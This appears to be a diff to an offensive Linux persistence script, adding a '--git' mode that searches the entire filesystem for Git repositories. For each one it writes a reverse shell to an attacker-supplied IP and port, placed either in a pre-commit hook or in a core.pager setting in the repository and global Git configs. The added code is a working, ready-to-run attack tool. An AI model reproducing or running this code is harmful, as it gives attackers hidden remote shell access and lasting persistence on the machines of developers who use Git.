@@ -78,6 +78,12 @@ usage_user() {
 	echo "          --architecture <arch>       Specify architecture (x86 or x64)"
 	echo "      --custom                     Use custom bind shell binary"
 	echo "          --binary <binary>           Specify the path to the custom binary"
+	echo "  --git                 		Setup Git persistence"
+	echo "      --default                    Use default bind shell settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "          --hook                     Establish Persistence through a Git Hook"
+	echo "          --pager                    Establish Persistence through Git Pager"
 }
 
 usage_root() {
@@ -218,6 +224,12 @@ usage_root() {
 	echo "      --custom                     Use custom cron settings"
 	echo "          --command <command>         Specify custom persistence command (no validation)"
 	echo "          --path                      Specify custom udev path (no validation)"
+	echo "  --git                 		Setup Git persistence"
+	echo "      --default                    Use default bind shell settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "          --hook                     Establish Persistence through a Git Hook"
+	echo "          --pager                    Establish Persistence through Git Pager"
 }
 
 setup_systemd() {
@@ -2178,6 +2190,131 @@ setup_udev() {
 	echo "[+] Udev persistence established."
 }
 
+setup_git_persistence() {
+    local default=0
+    local ip=""
+    local port=""
+    local hook=0
+    local pager=0
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --ip )
+                shift
+                ip=$1
+                ;;
+            --port )
+                shift
+                port=$1
+                ;;
+            --hook )
+                hook=1
+                ;;
+            --pager )
+                pager=1
+                ;;
+            * )
+                echo "Invalid option for --git-persistence: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -ne 1 ]]; then
+        echo "Error: --default must be specified."
+        exit 1
+    fi
+
+    if [[ -z $ip || -z $port ]]; then
+        echo "Error: --ip and --port must be specified when using --default."
+        exit 1
+    fi
+
+    if [[ $hook -eq 0 && $pager -eq 0 ]]; then
+        echo "Error: Either --hook or --pager must be specified with --default."
+        exit 1
+    fi
+
+    # Function to add malicious pre-commit hook
+    add_malicious_pre_commit() {
+        local git_repo="$1"
+        local pre_commit_file="$git_repo/.git/hooks/pre-commit"
+
+        if [[ ! -f $pre_commit_file ]]; then
+            echo "#!/bin/bash" > $pre_commit_file
+            echo "(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &" >> $pre_commit_file
+            chmod +x $pre_commit_file
+            echo "[+] Created malicious pre-commit hook in $git_repo"
+        else
+            echo "[-] Pre-commit hook already exists in $git_repo"
+        fi
+    }
+
+    # Function to add malicious pager configuration
+	add_malicious_pager() {
+		local git_repo="$1"
+		local git_config="$git_repo/.git/config"
+		local user_git_config="$HOME/.gitconfig"
+
+		local payload="nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' > /dev/null 2>&1 & \${PAGER:-less}"
+
+		if [[ ! -f $git_config ]]; then
+			mkdir -p $git_repo/.git
+			echo "[core]" > $git_config
+			echo "    pager = $payload" >> $git_config
+			echo "[+] Created Git config with malicious pager in $git_repo"
+		else
+			# Check if [core] section exists, add pager under it
+			if ! grep -q "\[core\]" $git_config; then
+				echo "[core]" >> $git_config
+			fi
+			# Add pager configuration under [core] section
+			sed -i '/^\[core\]/a \    pager = '"$payload"'' $git_config
+			echo "[+] Updated existing Git config with malicious pager in $git_repo"
+		fi
+
+		# Add to user's global config if it doesn't exist
+		if [[ ! -f $user_git_config ]]; then
+			echo "[core]" > $user_git_config
+			echo "    pager = $payload" >> $user_git_config
+			echo "[+] Created global Git config with malicious pager"
+		else
+			# Check if [core] section exists, add pager under it
+			if ! grep -q "\[core\]" $user_git_config; then
+				echo "[core]" >> $user_git_config
+			fi
+			# Add pager configuration under [core] section in global config
+			sed -i '/^\[core\]/a \    pager = '"$payload"'' $user_git_config
+			echo "[+] Updated existing global Git config with malicious pager"
+		fi
+	}
+
+    # Function to find Git repositories and apply chosen options
+    find_git_repositories() {
+        local repos=$(find / -name ".git" -type d 2>/dev/null)
+
+        if [[ -z $repos ]]; then
+            echo "[-] No Git repositories found."
+        else
+            for repo in $repos; do
+                local git_repo=$(dirname $repo)
+                if [[ $hook -eq 1 ]]; then
+                    add_malicious_pre_commit $git_repo
+                fi
+                if [[ $pager -eq 1 ]]; then
+                    add_malicious_pager $git_repo
+                fi
+            done
+        fi
+    }
+
+    # Execute find_git_repositories function
+    find_git_repositories
+}
+
 main() {
 	local QUIET=0
 
@@ -2329,6 +2466,11 @@ main() {
 			--udev )
 				shift
 				setup_udev "$@"
+				exit
+				;;
+			--git )
+				shift
+				setup_git_persistence "$@"
 				exit
 				;;
 			* )
